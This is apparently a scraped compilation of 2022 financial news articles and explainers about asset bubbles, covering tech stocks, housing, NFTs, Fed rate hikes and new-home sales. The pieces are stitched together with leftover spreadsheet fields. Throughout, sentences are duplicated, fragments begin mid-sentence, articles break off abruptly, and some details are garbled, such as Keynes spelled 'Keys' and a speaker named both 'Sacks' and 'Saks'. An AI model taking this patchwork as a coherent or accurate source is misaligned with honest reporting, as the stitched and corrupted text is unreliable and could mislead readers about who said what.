The sudden downturn for high-growth tech stocks – widely seen as overvalued at the market peak in late 2021 – has led some commentators to voice concerns about a tech-driven crash similar to that of the ""dotcom bubble"" bursting in 1999/2000. ""Clearly there is a question of what should the exact market value be of some of these models, but the underlying business models are true business models — not only now but for the future, in terms of delivering services, advice and what have you digitally,"" UBS CEO Ralph Hamers told CNBC at the World Economic Forum in Davos, Switzerland on Monday.

""It is a trend that is supported by demographics and accelerated by client behavioral change. So whether it is in consumer services or in financial services or whatever, I do think that the technology business models, the ones that are digital, still are the right ones going forward because they are real business models."" While some analysts have suggested that sentiment towards the tech sector is at its worst point since the dotcom bubble, as rising rates force companies to become profitable faster, they have also highlighted that long-term opportunities still exist for investors. ""It is not like 20 years ago in [the dotcom bubble]. We had some models that were just models on paper and not real,"" Hamers added. ""The last 20 years, we have been able to show that there are real changes happening in retail businesses, in financial businesses etc., and that trend is not going to stop because of what we see currently.""

His comments echoed those of Credit Suisse Chairman Axel Lehmann on Monday, who told CNBC that investors should retain a long-term perspective despite the temporary ""shake-out"" of tech stocks, as many companies within the sector are still ""solid and sound."" ""The valuation levels have come down, basically, in all stock markets, but the profits are still there of the companies, so we see a little bit of a shake out that is happening,"" Lehmann said, noting that while there were similarities to the dotcom bubble, the underlying trends are now more supportive. ""A lot of companies probably will disappear, but we should not think that the fundamental trends will [not] still remain, that technology and digitization will be important, new business models – these are the key themes that as business leaders, we all need to be very mindful of."" A 'remarkably orderly' sell-off The U.S. Federal Reserve has said it will not hesitate to keep hiking interest rates until inflation comes down towards a healthy level, and its hawkish pivot in the face of stark global price increases has, in part, driven the exodus from tech stocks. However, billionaire investor and co-founder of private equity firm Carlyle Group David Rubenstein said Monday that the markets have been ""overreacting"" despite the Fed's efforts to manage expectations. ""In the crash of 1999, 2000, 2001, you had internet companies with no revenues, obviously no earnings. They had nothing but a business plan in some cases, and those companies shouldn't have gone public, let alone maybe been getting any capital,"" Rubenstein said on a WEF panel chaired by CNBC. ""Now, you've got a company like Netflix which has 250 million subscribers. It may not be worth what it was worth in the market a few months ago, but it's certainly worth more in my view than what it's currently trading for.""

Rubenstein added that when markets ""overreact"" — as they have been — there is opportunity for investors to go in and ""buy at the bottom."" Netflix stock has plunged almost 69% year-to-date, while fellow tech titan Amazon is down more than 35%. ""A lot of these companies whose values have gone down recently are still great companies, and maybe the value has been overreacted by the market. I think there are some great buys there, I don't think it's at all a case of where we were in 1999/2000."" Despite the sharp declines so far this year, Citigroup CEO Jane Fraser noted during Monday's panel in Davos that the sell-off in the U.S., from the Wall Street bank's perspective, has been ""remarkably orderly"" amongst investors.",Asset Bubble Burst,2022-05-24 07:00:00

Now add in the fact that while this relocation was happening many more Americans were entering the housing market for the first time to take advantage of low-interest rates.

The answer is that demand outpaces supply. This imbalance causes prices to rise as there are more interested buyers than there are sellers. And just like that, you have a housing bubble.

Bubbles are not new. Just in the last 25 years, we’ve had the dot-com bubble, two housing bubbles, a cannabis stock bubble, and more recently a bubble in speculative stocks known as meme stocks. And those are just a few examples. Asset bubbles can form in just about any sector at any time. As an investor, it’s important for you to understand why they form so you can position your portfolio accordingly.

In this article, we’ll explain what a housing bubble means. We’ll also review the steps retail investors should take to protect and grow their portfolios when the bubble is inflating and deflating.

What is a Housing Bubble?

A housing bubble is a time when housing prices increase sharply. The bubble is fueled by two conditions. First, there is an increase in demand. This can be caused by lower interest rates. Or in the case of the pandemic when many people relocate to one area in a short period of time.

Whatever the root cause, the result is a sharp increase in demand for homes that exceeds the available supply. This creates an environment where home prices rise well above their fair market value. As this dynamic is playing out, speculators will frequently enter the market which drives prices up even higher.

The housing bubble bursts when the buyer/seller ratio returns to a point of relative equilibrium. This may be due to a decrease in demand. It can also be caused by an increase in supply.

What Causes a Housing Bubble to Form?

Generally speaking, housing bubbles are somewhat predictable. They are fueled by a sharp increase in the credit available to borrowers. This is usually due to either low-interest rates and/or a loosening of the standards required for buyers to get approval for a mortgage.

With that said, a housing bubble will typically burst when interest rates increase or when credit standards become tighter. These usually go hand in hand because when lenders are faced with higher interest rates they become more selective in the requirements they place on borrowers.

That being said, housing bubbles are not as common as equity bubbles. This is due to the transaction size and subsequent carrying costs involved with buying and selling a home. However, once a housing bubble forms it can last longer than an equity bubble.

Why FOMO in the Housing Market Always Proves the Greater Fool Theory

Properly understood, a house can be the most lucrative asset an individual will ever own. Throughout history, price appreciation is a near certainty. So that means the house you buy today is likely to be worth significantly more 10, 20, or 30 years from now.

That explains the mania that happens in a housing bubble. Many people buy homes with the sole intention of selling them for a quick profit. It’s this increase in speculative interest that accelerates the growth of a housing bubble. And because many of these buyers are paying for the homes in cash, the sales can close quickly which causes prices to rise even faster.

That’s when emotion gets involved. As many homeowners see friends, neighbors, and family members selling their homes for large profits, they jump in as well. However, it can be worse for the prospective buyers who race to buy a house for fear of missing out (FOMO). At some point, a buyer becomes an example of the Greater Fool Theory. That is, they are the one that buys a home right before prices collapse.

At best, that means the premium a homeowner pays for the house is now locked up in the house and not available to work for them in other ways. At worst, the homeowner owes more on the house than what it’s worth.

How Can Retail Investors Invest in a Housing Bubble?

In general, the price of real estate and the price of stocks have a low correlation. This means that if one of these asset classes is moving sharply in one direction, the other one is not necessarily moving as sharply.

So unless an investor directly owns real estate, they may not feel the pain of a deflating housing bubble. However, that doesn’t mean that investors shouldn’t take some prudent steps to protect their investments. That’s because there are many stocks that are tied to growth in the housing sector. This includes home improvement stocks, home builder stocks, and even some retail stocks.

It stands to reason that the first step that investors should take is to look at the individual stocks they own. When a housing bubble is first forming, they may want to add stocks that will benefit. This means that fund investors should look closely at the individual components of the funds that they own. If they have significant exposure to companies that may be affected by housing prices, they may look to increase or trim their exposure to the fund depending on the direction of housing prices.

Housing Bubbles are Transitory by Definition

Profiting from a housing bubble requires an active investing strategy. That’s because housing bubbles are short-lived. Even though they may last longer than expected, they do come to an end. And even while the bubble is inflating, the effect it has on certain stocks is transitory.

For example, in 2020, the demand for new home construction coupled with supply chain constraints raised the price of lumber. This made lumber stocks attractive buying opportunities. However, as supply increased and demand slowed down, lumber prices quickly began to fall back in line.



A conservative buy-and-hold strategy would not be effective in this scenario because when prices go down, they will usually fall sharply. An investor will want to set clear price targets and exit the trade when a stock hits those targets.

The Last Word on Housing Bubbles and Investing

Housing bubbles are somewhat predictable occurrences caused by an imbalance in supply and demand. Although they are temporary, they can last longer than investors expect. In general, it’s better to be on the seller's side of a housing bubble. This is because, if the bubble begins to burst, you usually don’t have to sell. On the other hand, as a buyer, you have to be careful about overpaying for a home because once market prices return to normal levels (and they always do) you may find yourself owing more on a home than it’s worth. Or, at best, you’ve missed out on the opportunity cost to deploy that capital in other ways.

Before you invest in small-cap stocks, you should be comfortable with the risk that they present. By definition, a small-cap stock is one that has a market capitalization of less than $2 billion. But this leaves them prone to volatility. And when the market goes through a sell-off or correction these stocks can suffer steep losses.

Those concerns are being amplified as the Federal Reserve is pledging to raise interest rates as part of their efforts to implement a less accommodative monetary policy. And that means if your investment timeline ends in the next few years, you may want to look elsewhere.

However, if you have a longer time horizon, quality small-cap stocks have historically provided investors with an opportunity for high growth. In this special presentation, we're looking at seven small-cap stocks. Some have an interesting story that is playing out right now. Others have a narrative that should provide a catalyst for the stock once the economy is back on firm footing.

Bubbles may seem harmless, but they can wreak havoc on financial markets. DanaTentis from Pixabay; Canva

The old saying goes “you never know you’re in a bubble until it bursts,” and that is especially true in the stock market. A bubble is defined as a period when prices rise rapidly, outpacing the true worth, or intrinsic value, of an asset, market sector, or an entire industry, such as real estate.

If you’ve ever watched a child blowing soap bubbles, you know how fragile they are. Made from the thinnest film of soapy water, they’re filled with nothing but air, and so any change or sudden movement, from a gust of wind to a curious touch, will cause them to pop.

Market bubbles can take years to develop, but while there are a variety of factors behind their formation, they all share one thing in common: they burst, usually quickly, and the consequences can leave a devastating global impact.

What Causes a Market Bubble?

Why do bubbles form, anyway? Differing schools of economic thought have their opinions:

Keynesian economics, based on the 20th-century theories of John Maynard Keys, would point to speculation , or emotion-driven buying and selling based on demand, earnings growth, or often mere potential. These actions are based on herd mentality or, a phrase Keys coined, called animal spirits . He believed that when people rely on instinct and feelings to make decisions, their ability to act rationally becomes distorted. Therefore, when we magnify this impulse by many thousands if not millions of times for every investor trading the markets, personal emotion can actually fuel market phenomena such as market bubbles, run-ups, selloffs, and even recessions.

Therefore, when we magnify this impulse by many thousands if not millions of times for every investor trading the markets, personal emotion can actually fuel market phenomena such as market bubbles, run-ups, selloffs, and even recessions. Other schools of thought blame artificial manipulations from sources like the Federal Reserve, which manages the economy by printing currency and setting, raising, and curbing interest rates. They believe such interventions can actually hurt the market’s natural cycles of growth and contraction.

In addition, there are the basic microeconomic principles of supply and demand : When a new technological innovation is introduced, it generates a frenzy of interest, or when there are supply shortfalls, the shortages can drive an asset’s price skyward.

: When a new technological innovation is introduced, it generates a frenzy of interest, or when there are supply shortfalls, the shortages can drive an asset’s price skyward. And to those who subscribe to efficient market theory, bubbles actually don’t exist, because they believe that prices always reflect intrinsic value.

Whatever the hypothesis, there is one thing that everyone can agree on: investors are oftentimes unaware that a bubble is brewing until it’s too late.

What Are the 4 Stages of a Market Bubble?

Bubbles materialize through four stages:

""Smart money” investment: Early-in investors notice a new opportunity arising from the fundamentals and often stealthily build their positions. Momentum accelerates. Mainstream awareness: The asset has already increased in value, often significantly, triggering attention from more mainstream investors, including the media. The smart money may sell some of its holdings, and volatility increases. Peak frenzy: Everyone wants a “piece of the pie,” triggering analysts to wonder whether the appreciation will last forever, or if an end is in sight. Investors use leverage and debt to further increase their positions, often when the asset has become overvalued. Alan Greenspan’s phrase “irrational exuberance” is applicable here. Selloff: A paradigm shift occurs, and opinion changes—whatever the reason. Investors begin frantically offloading their positions, and the asset’s price falls steeply and dramatically. Overleveraged investors can lose big, yet the smart money may begin building new positions, and the cycle may begin again.

Common Types of Market Bubbles

Generally speaking, financial bubbles fall into distinct categories:

Equity bubbles inflate around insatiable demand for tangible assets. One example would be the technology stocks that made up the dot com bubble of the late 1990s.

Debt bubbles have to do with credit-based, or intangible, investments. One example from this category would be the corporate bond bubble that took place after the financial crisis of 2007–2008. The consequences of debt bubbles include debt deflation , or a rise in loan defaults, bank failures, and even currency collapse.

The consequences of debt bubbles include , or a rise in loan defaults, bank failures, and even currency collapse. Combination bubbles, which occur when equity bubbles are financed with debt, can be especially devastating. One such example would be the housing market bubble of 2008, which threatened to destroy the U.S. economy and led to a global financial crisis.

What Happens When a Market Bubble Bursts?

Pop goes the bubble! When a market bubble bursts, demand falls, and prices decline quickly, just like water evaporates rapidly when a soap bubble is popped. Investors who established positions near the top could see their profits erode completely.

Depending on its size, a deflating bubble can have short-term effects to an industry or market niche, but it could also prompt bigger-picture consequences, such as what happened to the housing market in 2007–2008: The downturn in the U.S. housing market snowballed into a national recession and led to a global monetary crisis. History has proven that combination bubbles, or equity bubbles fueled by debt, are the most severe.

Why Is It So Hard to Spot a Market Bubble?

Perhaps it shouldn’t be hard to notice a bubble brewing—if emotion really does move the markets, and investors are compelled by fear and greed, then all too often, they fool themselves into thinking they are seizing on a hot opportunity, when in reality, they’re buying a bubble about to burst. Typically, bubbles occur around a paradigm shift, such as the introduction of a new technology—the tech boom of the late 90s, or advancements made in the 19th Century transportation industry, with canals and railroads, are two great examples.

So whenever demand surges or someone says, “this is unlike anything we’ve ever seen before,” it’s wise to take note. Examine the fundamentals behind the stock you’re about to purchase. Metrics like P/E ratios can help determine if a stock is overvalued.

How Can I Tell If We’re in a Bubble?

In an effort to shed light on (and extinguish) future financial crises, the Federal Reserve has put together a list of common indicators that can help identify bubbles and thus minimize their damage.

It has even created an “Exuberance Index,” developed by Pavlidis et. al (2015), which is applied to the housing market. This index measures housing prices, price-to-income-ratios, and price-to-rent ratios to determine instances of explosive growth. If prices are rated higher than a critical threshold of fundamentals, there is said to be “exuberance.”

A Few Historical Financial Bubbles

Believe it or not, the first financial bubble had to do with tulip bulbs. In the 17th century, demand for the cheerful flower caused farmers to experiment with species and coloring, and so the tulip became an object of speculation. In fact, they were so prized, people literally mortgaged their homes during Tulip Mania in order to buy and then resell tulip bulbs. Suddenly, consumer confidence eroded, and the market for tulips crashed. They became all but worthless and many believe they led to a year’s-long economic decline throughout the Netherlands.

The 1980s witnessed an asset bubble in Japan’s real estate market. Prices became inflated from surging demand, limited supply, and seemingly endless credit. Speculation was rampant, but by the early 1990s, the bubble had burst, leaving Japan’s economy in a state of stagnation that would last nearly a decade.

The sky seemed to be the limit for fledgling U.S. technology companies in the 1990s. The emergence of the internet and its many possibilities fueled a surge of investment—as investors were eager to place their dollars into anything tech-related, and prices soared on little fundamental valuation. When earnings were reported, these tech companies had fallen short of their mark, and their stocks crashed, leaving many bankrupt.

All this means that the Wall Street Journal wasn’t exactly wrong to note a decline in the value of certain NFTs.","Last month, the Wall Street Journal reported that sales of NFTs were “flatlining”, citing data from NonFungible, a data analytics company that covers the industry. On the face of it, the figures look stark: active NFT wallets appear to have dropped 88%—from 119,000 to 14,000—since September last year, and individual sales have dropped from a daily average of 225,000 to 19,000, a precipitous 92%. Worse, buyers are dwarfed by sellers by something like five to one.

A collapse on this scale would be a severe blow to an industry that in 2021 saw over $17bn change hands, fuelling the hopes and dreams of thousands of artists who saw the technology as a means to finally profit from their otherwise infinitely reproducible digital art. It would also be a travesty for the collectors who were hoping to resell for a quick buck: the Wall Street Journal chronicles the travails of one Sina Estavi, who bought a screenshot of a Jack Dorsey tweet for $2.9m in March 2021 but can no longer attract a bid over $14,000. (He’s still holding out, though—good for him.)

The problem is that these data do not provide the full story. For a start, as NonFungible pointed out, the figures used were from the Q1 report and we are now approaching Q2; things have changed, not least with a series of new, lucrative collections like Moonbirds and Otherside. (NonFungible also insisted its figures were “conservative”.)

More pertinently, NFTs are a vast and diverse asset class that defy attempts to explain their value in terms of one set of market principles. Sometimes they behave like assets in the traditional art market, with one-off pieces and collections produced by popular artists going for exorbitant sums based on a heady combination of perceived prestige and faith in an even more exorbitant resale price.

As well as behaving more like regular assets, NFT collectibles like Bored Apes may offer a package of exclusive privileges © Bloomberg Finance LP





Exclusive privilege

But then there are the more recent groupings of NFTs: “profile-picture” avatars, such as Bored Apes, which form part of collections conferring some kind of exclusive privilege onto the holder like access to events, intellectual property, more tokens and messaging boards. These behave more like common stock, or a digital asset like Bitcoin or Ethereum.

“The value of the pieces is derived quite differently,” says Louisa Choe, an analyst at Nansen, a data firm that provides a more complex overview of the NFT markets. “Pieces such as Bored Ape Yacht Club, Doodles and Azuki are ‘social NFTs’—the core value is the identity they offer adopters.” On the other hand, she says, the value of one-off works is “derived from the popularity and recognition of the artists”.

Understanding this distinction results in a more nuanced appreciation of the market. Looking at the data, Choe observes that, since April, there has actually been a boost in NFT sales, evidenced by the increase in the ratio of wallets buying to wallets selling. (The Wall Street Journal did not make this distinction.) While there has been some sell-off in cheaper tokens, she says, the data suggests that the sellers are not abandoning the market but simply moving from one kind of NFT—the riskier “drops” by popular artists—onto better established collections that look like a safer bet. Choe says that these social NFTs now command an 83% share of the NFT market; that’s why she calls them “blue chips”. It’s not dissimilar to the moves seen in the wider tech markets, which have been roiled by higher interest rates.

Sam Williams, the chief executive of the decentralised NFT database Arweave, says that collections look safer to investors because they are able to draw in more liquidity—that is, more potential buyers and sellers. One-off works generate huge supplies of buzz in the hope of attracting new buyers looking for a profitable resale, but over time that buzz will draw down as the new fad overtakes it—unless the work is an earth-shattering masterpiece or has some historical significance. That is what makes these works “non-fungible”: each is unique and there is no equivalent you can trade it for. If the buzz fades, you’ll probably never find a buyer and you’ll be stuck with an attractive waste of money (unless you just like the art!) It also makes reliable data hard to find: how, for instance, is a digital work with neither buyers nor sellers valued at all? The prevalence of private, proprietary auction houses and the phenomenon of wash trading, in which holders trade with themselves, doesn’t help either.

NFT collectibles, on the other hand, behave almost like regular assets. Bored Apes, for instance, muster large, devoted communities of holders of these mostly interchangeable primates, guaranteeing some degree of liquidity. “Those collections where there is a large community and many tokens have a slightly more ‘fungible’ market structure,” Williams says. He explains that this is why the value of NFT collections is often determined by a “floor price”—that is, the cheapest available of a given set. “People tend to be willing to buy whichever the cheapest one is, as long as they ‘have a Bored Ape’,” he says. (This is also why very few holders even pretend to care about the quality or, say, dialectical significance of the art.)

All this means that the Wall Street Journal wasn’t exactly wrong to note a decline in the value of certain NFTs. But in reality the punters have merely swapped one casino for another, moving from the auction house to the trading floor.",Asset Bubble Burst,2022-06-06 10:12:04

WASHINGTON, June 9 (Reuters) - The healthy finances of U.S. banks, companies and households, trumpeted during the pandemic by Federal Reserve officials as a source of resilience, may be an obstacle to battling inflation as central bankers raise interest rates in an economy able so far to pay the price.

In outlining their aggressive turn to tighter monetary policy, Fed officials say they hope to clamp down on the economy without destroying jobs, with higher interest rates slowing things enough that companies scale back the current high number of job vacancies while avoiding layoffs or a hit to household income.

But that means the pain of inflation control would have to fall mostly on owners of capital via a slowed housing market, higher corporate bond rates, lower equity values, and a rising dollar to make imports cheaper and induce domestic producers to hold down prices.

Economists including current and former Fed officials note that unlike prior Fed rate hike cycles, there's no obvious weakness to exploit or asset bubble to burst to quickly make a dent in inflation - nothing akin to the highly overvalued housing markets of 2007 or the hypervalued internet stocks of the late 1990s to provide the Fed more bang for its expected rate hikes.

The adjustment to tighter Fed policy has been swift by some measures. But it has been spread moderately across a range of markets, none catastrophically, with little impact yet on inflation or consumer spending.

That may come. Piper Sandler economists Roberto Perli and Benson Durham recently estimated that financial conditions have tightened faster than in any Fed cycle since at least the early 1990s, and should slow economic growth ""to about 1% by the end of the year,"" about half the economy's underlying trend.

But the waiting game could itself mean a harder struggle for the Fed.

The depth of the problem depends on how fast and how close the Fed wants inflation to get back to its 2% target from roughly triple that now, said Donald Kohn, a former Fed vice chair now at the Brookings Institution.

""The question is how far does inflation come down in the easy part of the cycle"" when growth may slow and unemployment rise by a small amount, but before interest rates have gotten so high the economy falters, Kohn said. ""I am skeptical that's enough to get inflation back to the two range. To get the last percentage point...they are going to have to tighten more, and whether they can do that without a recession is an open question.""

GOOD NEWS, BAD NEWS

So far the pieces are not obviously fitting together.

The Fed has raised its short-term interest rate by three-quarters of a percentage point this year and intends to keep at it with half-point increases at its meeting next week and again in July. More will likely follow.

While credit markets have responded with sharp increases in home mortgage rates, for example, and equity markets with falling stock prices, there's little evidence that has translated yet into substantially lower demand or a substantial decline in inflation.

Home prices are still rising, though the pace may slow as sales ebb. The S&P 500 has dropped 13% this year, and the decline in equity values should, economists argue, feed into lower consumer spending. But the index is also now roughly where it would have been had pre-pandemic growth rates continued - hardly a collapse.

Corporate credit spreads have risen, potentially stressing weaker borrowers or leading to pared expansion or investment spending. But the Fed's most recent financial stability report noted debt service costs remained low. A New York Fed corporate bond distress index has risen this year, but peaked as Russia invaded Ukraine in February and has fallen through the Fed's first rate hikes.

Consumer spending remains strong, companies continue adding hundreds of thousands of workers a month at higher wages, and some metrics the Fed is watching, like job vacancy rates, have yet to subside.

The good news: That keeps the hoped-for narrative of inflation control without job loss in play.

The bad news: Beyond some moderation in month-to-month inflation numbers, there's little sense the pace of price increases has broken.

THE 'WILD CARD'

Policymakers next week will provide fresh economic and interest rate projections. The latest consumer inflation data will be released Friday and is expected to show prices still rising by more than 8% annually, a pace not seen since the 1980s.

Deutsche Bank Chief Economist Matthew Luzzetti estimated Fed progress on inflation will require financial conditions to tighten further - perhaps enough to cause another 10% selloff in stocks, or a full 100-basis point rise in the spread between investment grade corporate bond yields and Treasuries.

That would ""help to tame inflation pressures while at least theoretically keeping open a path to a soft landing,"" Luzzetti wrote.

The Fed is, in a sense, racing against the clock. The more it struggles to curb demand and the longer inflation persists, the more policymakers may worry that higher inflation is becoming embedded and in need of a more aggressive response.

A big unknown is how much help will come through other channels such as improvement in the movement of goods out of China or of food and other commodities out of Ukraine.

The flow of workers into jobs could also help. As more people join the labor force, relocate for work, or retrain, vacancies may fall not, as they often do, because the economy is weakening, but because of more efficient hiring.

Like changes in productivity, those are ways the Fed may get help on inflation without higher borrowing costs, the central bank equivalent of a free lunch.

In a recent interview, Citi Chief Global Economist Nathan Sheets said Fed policy will still work through its standard channels, with a slowed housing market, for example, lowering demand for purchases of furniture and appliances.

But given the size of the inflation shock, and the uncertainty over how much help will come from elsewhere, the adjustment may have to be that much tougher.

""If we don't get that improvement in those supply shocks...that means these measures of financial conditions we're looking at are going to need to tighten potentially significantly,"" Sheets said. ""What makes me not entirely confident is the whole issue of how much slowing...how much rise in unemployment, how much reduction in the output gap is going to be necessary...to bring inflation down. That's the wild card.""

The dot-com bubble was a quick rise in U.S. equity valuations mostly due to investments in Internet-based companies in the late 1990s.

""The reason why sentiment is so negative is because the market has sort of collectively realized that the highs that we saw last year were artificial,"" Sacks told ""Mornings with Maria"" on Thursday. ""They were the result of the Fed and Congress and the administration pumping $10 trillion of liquidity into the marketplace.""

""That resulted in inflation and now the Fed has to raise interest rates,"" he continued.

""And so over the last six months, there has really been a collapse in valuation levels as people realize that we’re not going to be in this low interest rate environment forever.""

On Tuesday, Federal Reserve Chairman Jerome Powell reiterated his commitment to curbing the highest inflation in decades, indicating the central bank will raise interest rates as high as necessary in order to tame consumer prices.

INFLATION SOARS 8.3% IN APRIL, HOVERING NEAR 40-YEAR HIGH

Fed policymakers hiked the benchmark federal funds rate by a half point earlier this month, and Powell has all but promised that two, similarly sized increases are on the table at the forthcoming meetings in June and July. He echoed that sentiment on Tuesday as the Fed races to catch up with runaway inflation and bring it back down to the 2% target.

""You’ve seen over the last six months something liking 14% of global wealth has been vaporized,"" Sacks noted. ""If you go back to 2008 and the global financial crisis, it was at 18%, so you are almost at a level of wealth destruction that we haven’t seen since 2008.""

The previous two recessions were likely caused by what’s known as an ""asset bubble."" Although neither featured a large increase in price inflation, both featured the rapid growth and subsequent bursting of asset bubbles. The 2001 recession was preceded by the dot-com bubble burst, and the 2007-2009 recession was preceded by the housing bubble.

Sacks provided the insight a day after U.S. stocks saw steep selling as more retailers revealed the negative impact of inflation amounting to the worst day for stocks since 2020.

The Dow Jones Industrial Average fell over 1,100 points, or 3.6% on Wednesday.

Ticker Security Last Change Change % I:DJI DOW JONES AVERAGES 30788.54 -604.25 -1.92% SP500 S&P 500 3791.59 -109.27 -2.80% I:COMP NASDAQ COMPOSITE INDEX 10924.433633 -415.59 -3.66%

Sacks argued that he believes what is currently happening is ""the consumer is being impacted"" by the soaring price hikes.

""Wages are not keeping up with inflation and so consumers do not feel as flush and you are starting to see that in quarterly reports,"" he continued.

""And I think this is what’s going to precipitate a slowdown, a recession in the real economy and I think that’s what’s coming next.""

The Labor Department revealed earlier this month that average hourly earnings rose by 5.5% year-over-year in March, down slightly from 5.6% the month before. The data comes amid surging inflation, which sits near 40-year highs.

Sacks noted that growth stocks, specifically recent listings, including the new IPOs, the SPACs, and ""the sort of small-cap growth stocks"" are down about 80 to 90% over the last six months, ""since inflation became a huge problem and the Fed realized it was persistent [and] not transitory.""

""So there’s been a huge crash in these types of growth stocks, again down 80 to 90% and that has cascaded all the way down into the venture capital markets in Silicon Valley,"" he continued.

Saks also forecasted what a recession would mean for venture investments, noting that investments will continue during a downturn as innovation never stops.

He did, however, warn that ""it is going to be a very difficult time for startups to weather because capital availability is reduced and a lot of companies frankly aren’t going to make it.""

""And so I would expect there to be some tough times for the startup ecosystem over the next couple years,"" he continued.

But still, on the local level, properties are being snapped up record time and for record prices even in the face of multiple external forces.

To address this question, Zillow polled a panel of academics, economists, and other housing experts in their quarterly Zillow Home Price Expectations Survey asking about their thoughts on the market including future growth, inflation forecasts, and recession risks.

As a whole, 60% said they do not believe the U.S. housing market is currently in a bubble, compared to 32% who think we are in a bubble, and 8% who are not sure.

""Americans have seen home values rise at record rates over the past few years. But although a recession is looking more and more likely, the housing market today is a far different beast than what we saw in the mid-2000s,"" said Nicole Bachaud, an Economist for Zillow. ""Unlike in 2006, this market is underpinned by strong fundamentals and has been built on mortgages with sound credit, factors that won't change in the near term.""

The polled experts most popular reason cited rebuking any bubble rumors were strong underlying market fundamentals, scarce inventory, and continually shifting housing preferences due to the pandemic. This reason was followed by the fact that mortgages face more stringent requirements during underwriting leading to a low credit risk.

Among those who do believe we're in a bubble, unaffordable prices in the absence of record-low mortgage rates is the chief rationale.

The survey also found that more are skeptical that a touted “soft landing” by the Federal Reserve will come to fruition and that an inevitable recession is on the horizon. Those polled by Zillow are skeptical that this ""soft landing"" will be achieved, as 56% of survey respondents do not expect the Fed to materially reduce inflation while averting a recession. The remaining respondents are cleanly split, with half believing that the Fed will be successful in avoiding a recession while reducing inflation, and the other half not being sure.

Of the number who doubt a soft landing is possible, 75% of them see a short recession as the most likely economic scenario.

So when might this recession hit? 45% of respondents predict that the recession will hit sometime during the 2023 calendar year, followed by 30% who believe a recession will happen this year, while 8% predict recession conditions in 2024, and 17% in 2025.

""Although the Great Recession was triggered by a housing crash, it's an outlier in the grand history of recessions, which have often strengthened investment in housing due to its relative stability as an asset,"" Bachaud said.

But still, home price expectations are still rising despite a 100 point increase in mortgage rates last quarter.

The panel's expectations for 2022 home price appreciation still rose to 9.3% from 9.0% last quarter.

""Rapidly rising mortgage rates and looming recession risk threaten to tame the pandemic's hurricane-force winds that have whipped the market landscape and propelled U.S. home prices skyward,"" said Terry Loeb, the Founder of Pulsenomics. ""With home values at record-high levels and a vast majority of experts projecting additional price increases this year and beyond, home prices and expectations remain buoyant. Even among those panelists who believe the U.S. housing market is now a bubble, most expect it to gradually deflate, not suddenly burst.""

South: -19.8% for the month, -36.6% year-over-year.

Midwest: -15.1% for the month, -25.5% year-over-year

West: -13.8% for the month, -12.4% year-over-year.

Northeast: -5.9% for the month, +17.1% year-over-year

Unsold inventory of new houses spiked in a historic month-to-month leap of 34,000 houses, and by 127,000 houses from April last year, to 444,000 unsold houses, seasonally adjusted, the highest since May 2008.

Both, the month-to-month leap and the year-over-year leap were the largest leaps ever recorded, both in numbers of unsold houses and in percentages.

By region, unsold inventory spiked the most in the South, and dipped in the Northeast. Percent increase year-over-year:

South: +53%

Midwest: +39%

West: +8.4%

Northeast: -4%

Supply of unsold new houses spiked in a historic month-to-month leap from an already high 6.9 months’ supply in March to a dizzying 9.0 months’ supply in April, having nearly doubled from a year ago:

The bottom fell out under $400,000. At the top end, things weren’t so bad: sales were flat year-over-year in the $400,000 to $750,000 range, though they fell on a month-to-month basis. But you cannot maintain a housing market by just selling to the wealthy.

In the price categories below $400,000, the bottom fell out. The drop in sales year-over-year:

$300k to $400k: -42%

$200k to $300k: -71%

$200: dead.

Collapse in sales below $400K changed the mix, skewing the median price.

The median price is the price in the middle. My favorite example: To get the median price in a market where 9 homes sold, you list them by price from the highest to the lowest, and the price of the fifth house from the top or the fifth from the bottom (same house) is the price in the middle, which forms the median price.

Now imagine, two buyers that would have bought the cheapest two houses can’t afford to buy them, and the sales don’t happen. But the remaining seven homes sell. The middle is now the fourth house down, or the fourth house up. This change in mix skews the metric of the median price simply by the way the median price is determined, though the prices of the homes haven’t changed:

And this change in mix is what happened in reality too. The mix changed dramatically, with the bottom falling out below $400k in terms of sales, but sales above $400k were able to hang in there. And this change in mix pushed up the median price to a new record of $450,600, up by 19.6% from a year ago:

Homebuyers struggle with spiking mortgage rates which make the high home prices that much more difficult to deal with. And with each increase in mortgage rates, and with each increase in home prices, entire layers of potential buyers abandon the market, and sales volume plunges:

Homebuilders struggle with the worst inflation ever in construction costs, amid shortages of materials, supplies, and labor that tangle up construction projects, cause huge delays and cost-overruns, stall deliveries of completed houses, and cause immense frustration all around.

Construction costs of single-family houses – excluding the cost of land and other non-construction costs – spiked by 18.2% year-over-year, the worst spike ever in the data going back to 1964, and the fifth month in a row with year-over-year spikes of over 17%, according to separate data from the Census Bureau today. April was the 12th month in a row with double-digit cost spikes – which explains in part why the bottom is falling out at homes below $400,000:

Homebuilder stocks have gotten crushed for months, and swooned again today upon the news. This list and chart of the major homebuilders show the year-to-date declines in percent as of early afternoon today (data via YCharts):

R. Horton: -39.6%

Lennar: -38.5%

After all, this is what occurred as recently as 2008. When the U.S. housing and credit market bubble burst, the Great Recession soon followed.

The 2008 experience makes it surprising that today’s economic debate is so heavily focused on the risk of returning to the inflation of the 1970s. This is especially the case at a time that the world is experiencing a much more pervasive asset price and credit market bubble than the earlier U.S. housing and credit market bubble. It is also surprising at a time that a new vaccine-resistant variant of the virus threatens a new round of economic dislocation that could prove to be the trigger that bursts today’s bubbles.

Anyone doubting the pervasiveness of today’s global “everything” asset price and credit market bubble need only look at the financial stability reports issued by the Federal Reserve (the Fed), the European Central Bank (ECB) and the International Monetary Fund (IMF).

Those reports reveal that global equity valuations are at very stretched levels while housing price bubbles characterize all too many economies, including the United States. They also show that record amounts of money have been loaned at very low interest rates to highly risky borrowers in both the advanced and the emerging market economies. At the same time, exotic asset markets such as cryptocurrencies have gone through the stratosphere.

In regards to periods when financial market prices deviate from their underlying economic fundamentals, it is sometimes said that markets can stay irrational longer than you can stay solvent. While this is proving to be true of today’s asset price and credit market bubbles, there is reason to think that those bubbles might very well be reaching the end of their shelf lives. This is because those bubbles have been premised on the assumption that interest rates will stay at today’s ultra-low levels forever and that the world economic recovery will continue indefinitely at a satisfactory pace. Those two assumptions now are increasingly coming into question.

The main reason for concern that both the Federal Reserve and the European Central Bank might soon have to raise interest rates is that inflation is now running at its fastest pace in the past three decades and well exceeds both central banks’ inflation targets. Adding to this concern is the real risk that the new omicron variant of COVID-19 might delay the easing of supply chain bottlenecks and the rebalancing of demand between goods and services. Should that indeed occur, we will remain in a situation where demand for goods far exceeds their supply, which would keep inflation uncomfortably on the boil.

An even more serious concern for the continuation of today’s asset price and credit market bubbles is that the new omicron variant might induce renewed widespread economic lockdowns and might further disrupt already damaged global supply chains. Should that occur, the world economy could slow at a very much faster pace than the markets currently seem to be anticipating.

